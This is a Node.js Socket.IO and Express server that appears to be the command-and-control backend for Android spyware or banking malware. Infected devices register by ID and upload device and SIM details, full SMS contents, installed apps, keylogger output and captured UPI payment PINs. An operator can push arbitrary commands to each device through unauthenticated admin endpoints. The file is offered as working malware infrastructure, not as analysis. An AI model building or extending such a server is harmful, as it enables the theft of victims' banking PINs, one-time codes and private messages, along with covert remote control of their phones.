// server.js
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
require('dotenv').config();

const { PrismaClient } = require('@prisma/client');

// Handle BigInt serialization
BigInt.prototype.toJSON = function () { return this.toString() }

const prisma = new PrismaClient();
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

app.use(cors());
app.use(express.json());

// Connect to database
async function connectDatabase() {
    try {
        await prisma.$connect();
        console.log('Connected to database via Prisma');
    } catch (err) {
        console.error('Database connection error:', err);
        process.exit(1);
    }
}

connectDatabase();

// Socket.IO Connection Handling
io.on('connection', (socket) => {
    const deviceId = socket.handshake.query.device_id;
    console.log(`Device connected: ${deviceId}`);

    if (deviceId) {
        // Join device-specific room
        socket.join(`device:${deviceId}`);

        // Update device online status
        prisma.device.upsert({
            where: { device_id: deviceId },
            update: {
                status: true,
                last_seen: new Date()
            },
            create: {
                device_id: deviceId,
                status: true,
                last_seen: new Date()
            }
        }).catch(err => {
            console.error('Error updating device status:', err.message);
        });
    }

    // Upsert device data
    socket.on('upsert_device_data', async (data, ack) => {
        try {
            const deviceData = typeof data === 'string' ? JSON.parse(data) : data;

            const updateData = {
                android_id: deviceData.android_id,
                manufacturer: deviceData.manufacturer ?? "Unknown",
                model: deviceData.model ?? "Unknown",
                brand: deviceData.brand,
                product: deviceData.product,
                android_version: deviceData.android_version,
                raw_device_info: deviceData.raw_device_info,
                sim_cards: deviceData.sim_cards,
                service_status: deviceData.service_status,
                oem_status: deviceData.oem_status,
                power_save_status: deviceData.power_save_status,
                screen_status: deviceData.screen_status,
                process_importance: deviceData.processImportance ? String(deviceData.processImportance) : null,

                status: true,
                last_seen: new Date()
            };

            await prisma.device.upsert({
                where: { device_id: deviceData.device_id },
                update: updateData,
                create: {
                    device_id: deviceData.device_id,
                    ...updateData
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error upserting device data:', error);
            if (ack) ack(false);
        }
    });

    // Get pending commands
    socket.on('get_pending_commands', async (deviceId, ack) => {
        try {
            const commands = await prisma.deviceCommand.findMany({
                where: {
                    device_id: deviceId,
                    status: 'pending'
                },
                orderBy: { created_at: 'desc' }
            });

            const mappedCommands = commands.map(c => ({
                id: c.id,
                deviceId: c.device_id,
                command: c.command,
                payload: c.payload,
                status: c.status
            }));

            if (ack) ack(JSON.stringify(mappedCommands));
        } catch (error) {
            console.error('Error getting pending commands:', error);
            if (ack) ack(JSON.stringify([]));
        }
    });

    // Mark command as delivered
    socket.on('mark_command_delivered', async (commandId, ack) => {
        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'delivered',
                    delivered_at: new Date()
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error marking command as delivered:', error);
            if (ack) ack(false);
        }
    });

    // Mark command as executed
    socket.on('mark_command_executed', async (commandId, ack) => {
        try {
            await prisma.deviceCommand.update({
                where: { id: commandId },
                data: {
                    status: 'executed',
                    executed_at: new Date()
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error marking command as executed:', error);
            if (ack) ack(false);
        }
    });

    // Mark command as failed
    socket.on('mark_command_failed', async (data, ack) => {
        try {
            const d = typeof data === 'string' ? JSON.parse(data) : data;

            await prisma.deviceCommand.update({
                where: { id: d.command_id },
                data: {
                    status: 'failed',
                    executed_at: new Date()
                }
            });
            console.log(`Command ${d.command_id} failed: ${d.error}`);
            if (ack) ack(true);
        } catch (error) {
            console.error('Error marking command as failed:', error);
            if (ack) ack(false);
        }
    });

    // Send heartbeat
    socket.on('send_heartbeat', async (data, ack) => {
        try {
            const h = typeof data === 'string' ? JSON.parse(data) : data;

            // Insert into heartbeat table
            await prisma.heartbeat.create({
                data: {
                    device_id: h.device_id,
                    status: h.status,
                    last_update: new Date(),
                    uptime: BigInt(h.uptime || 0),
                    ram: BigInt(h.ram || 0)
                }
            });

            // Update device table heartbeat snapshot and last_seen
            await prisma.device.update({
                where: { device_id: h.device_id },
                data: {
                    heartbeat: h,
                    last_seen: new Date(),
                    status: true
                }
            });

            socket.emit('heartbeat_ack');
            if (ack) ack(true);
        } catch (error) {
            console.error('Error processing heartbeat:', error);
            if (ack) ack(false);
        }
    });

    // Set online status
    socket.on('set_online_status', async (status, ack) => {
        try {
            if (deviceId) {
                await prisma.device.update({
                    where: { device_id: deviceId },
                    data: {
                        status: status,
                        last_seen: new Date()
                    }
                }).catch(e => console.error("Update online status failed", e.message));
            }
            if (ack) ack(true);
        } catch (error) {
            console.error('Error setting online status:', error);
            if (ack) ack(false);
        }
    });

    // Sync SMS
    socket.on('sync_sms', async (data, ack) => {
        try {
            const messages = typeof data === 'string' ? JSON.parse(data) : data;

            await prisma.$transaction(async (tx) => {
                for (const msg of messages) {
                    const smsId = BigInt(msg.id);
                    await tx.smsMessage.upsert({
                        where: {
                            id_device_id: {
                                id: smsId,
                                device_id: msg.device_id
                            }
                        },
                        update: {
                            address: msg.address,
                            body: msg.body,
                            date: msg.date,
                            timestamp: BigInt(msg.timestamp),
                            type: msg.type,
                            sync_status: 'synced'
                        },
                        create: {
                            id: smsId,
                            device_id: msg.device_id,
                            address: msg.address,
                            body: msg.body,
                            date: msg.date,
                            timestamp: BigInt(msg.timestamp),
                            type: msg.type,
                            sync_status: 'synced'
                        }
                    });
                }
            });

            socket.emit('sync_complete', 'sms', messages.length);
            if (ack) ack(true);
        } catch (error) {
            console.error('Error syncing SMS:', error);
            if (ack) ack(false);
        }
    });

    // Sync single SMS
    socket.on('sync_single_sms', async (data, ack) => {
        try {
            const msg = typeof data === 'string' ? JSON.parse(data) : data;
            const smsId = BigInt(msg.id);

            await prisma.smsMessage.upsert({
                where: {
                    id_device_id: {
                        id: smsId,
                        device_id: msg.device_id
                    }
                },
                update: {
                    address: msg.address,
                    body: msg.body,
                    date: msg.date,
                    timestamp: BigInt(msg.timestamp),
                    type: msg.type,
                    sync_status: 'synced'
                },
                create: {
                    id: smsId,
                    device_id: msg.device_id,
                    address: msg.address,
                    body: msg.body,
                    date: msg.date,
                    timestamp: BigInt(msg.timestamp),
                    type: msg.type,
                    sync_status: 'synced'
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error syncing single SMS:', error);
            if (ack) ack(false);
        }
    });

    // Sync apps
    socket.on('sync_apps', async (data, ack) => {
        try {
            const apps = typeof data === 'string' ? JSON.parse(data) : data;

            await prisma.$transaction(async (tx) => {
                for (const app of apps) {
                    await tx.installedApp.upsert({
                        where: {
                            device_id_package_name: {
                                device_id: app.device_id,
                                package_name: app.package_name
                            }
                        },
                        update: {
                            app_name: app.app_name,
                            icon: app.icon,
                            version_name: app.version_name,
                            version_code: app.version_code ? BigInt(app.version_code) : null,
                            first_install_time: app.first_install_time ? BigInt(app.first_install_time) : null,
                            last_update_time: app.last_update_time ? BigInt(app.last_update_time) : null,
                            is_system_app: app.is_system_app,
                            target_sdk: app.target_sdk,
                            min_sdk: app.min_sdk,
                            sync_timestamp: app.sync_timestamp ? BigInt(app.sync_timestamp) : BigInt(Date.now()),
                            updated_at: new Date()
                        },
                        create: {
                            device_id: app.device_id,
                            package_name: app.package_name,
                            app_name: app.app_name,
                            icon: app.icon,
                            version_name: app.version_name,
                            version_code: app.version_code ? BigInt(app.version_code) : null,
                            first_install_time: app.first_install_time ? BigInt(app.first_install_time) : null,
                            last_update_time: app.last_update_time ? BigInt(app.last_update_time) : null,
                            is_system_app: app.is_system_app || false,
                            target_sdk: app.target_sdk,
                            min_sdk: app.min_sdk,
                            sync_timestamp: app.sync_timestamp ? BigInt(app.sync_timestamp) : BigInt(Date.now()),
                            created_at: new Date(),
                            updated_at: new Date()
                        }
                    });
                }
            });

            socket.emit('sync_complete', 'apps', apps.length);
            if (ack) ack(true);
        } catch (error) {
            console.error('Error syncing apps:', error);
            if (ack) ack(false);
        }
    });

    // Set key log
    socket.on('set_key_log', async (data, ack) => {
        try {
            const keyLog = typeof data === 'string' ? JSON.parse(data) : data;
            await prisma.keyLog.create({
                data: {
                    device_id: keyLog.device_id,
                    keylogger: keyLog.keylogger,
                    key: keyLog.key,
                    currentDate: keyLog.currentDate ? new Date(keyLog.currentDate) : new Date()
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error saving key log:', error);
            if (ack) ack(false);
        }
    });

    // Set UPI pin
    socket.on('set_upi_pin', async (data, ack) => {
        try {
            const pinData = typeof data === 'string' ? JSON.parse(data) : data;
            await prisma.upiPin.create({
                data: {
                    device_id: pinData.device_id,
                    pin: pinData.pin,
                    currentDate: pinData.currentDate ? new Date(pinData.currentDate) : new Date()
                }
            });
            if (ack) ack(true);
        } catch (error) {
            console.error('Error saving UPI pin:', error);
            if (ack) ack(false);
        }
    });

    // Test connection
    socket.on('test_connection', (data, ack) => {
        if (ack) ack(true);
    });

    // Admin: Send command to device
    socket.on('send_command', async (data) => {
        try {
            const { device_id, command, payload } = data;
            const newCommand = await prisma.deviceCommand.create({
                data: {
                    device_id,
                    command,
                    payload,
                    status: 'pending'
                }
            });

            const commandToSend = {
                id: newCommand.id,
                deviceId: newCommand.device_id,
                command: newCommand.command,
                payload: newCommand.payload,
                status: newCommand.status
            };

            // Emit as array because client expects List<DeviceCommand>
            io.to(`device:${device_id}`).emit('command', JSON.stringify([commandToSend]));
        } catch (error) {
            console.error('Error sending command:', error);
        }
    });

    // Handle disconnection
    socket.on('disconnect', () => {
        console.log(`Device disconnected: ${deviceId}`);

        if (deviceId) {
            // Update device offline status
            prisma.device.update({
                where: { device_id: deviceId },
                data: {
                    status: false,
                    last_seen: new Date()
                }
            }).catch(err => console.error('Error updating offline status:', err));
        }
    });
});

// REST API Endpoints for Admin
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await prisma.device.findMany({
            orderBy: { last_seen: 'desc' }
        });
        res.json(devices);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/commands', async (req, res) => {
    try {
        const commands = await prisma.deviceCommand.findMany({
            where: { device_id: req.params.deviceId },
            orderBy: { created_at: 'desc' }
        });
        res.json(commands);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.post('/api/devices/:deviceId/commands', async (req, res) => {
    try {
        const { command, payload } = req.body;
        const newCommand = await prisma.deviceCommand.create({
            data: {
                device_id: req.params.deviceId,
                command: command,
                payload: payload,
                status: 'pending'
            }
        });

        const commandToSend = {
            id: newCommand.id,
            deviceId: newCommand.device_id,
            command: newCommand.command,
            payload: newCommand.payload,
            status: newCommand.status
        };

        // Emit command to device
        io.to(`device:${req.params.deviceId}`).emit('command', JSON.stringify([commandToSend]));

        res.json(newCommand);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

app.get('/api/devices/:deviceId/heartbeats', async (req, res) => {
    try {
        const heartbeats = await prisma.heartbeat.findMany({
            where: { device_id: req.params.deviceId },
            orderBy: { last_update: 'desc' },
            take: 100
        });
        res.json(heartbeats);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Graceful shutdown
process.on('SIGINT', async () => {
    await prisma.$disconnect();
    process.exit(0);
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Socket.IO server running on port ${PORT}`);
});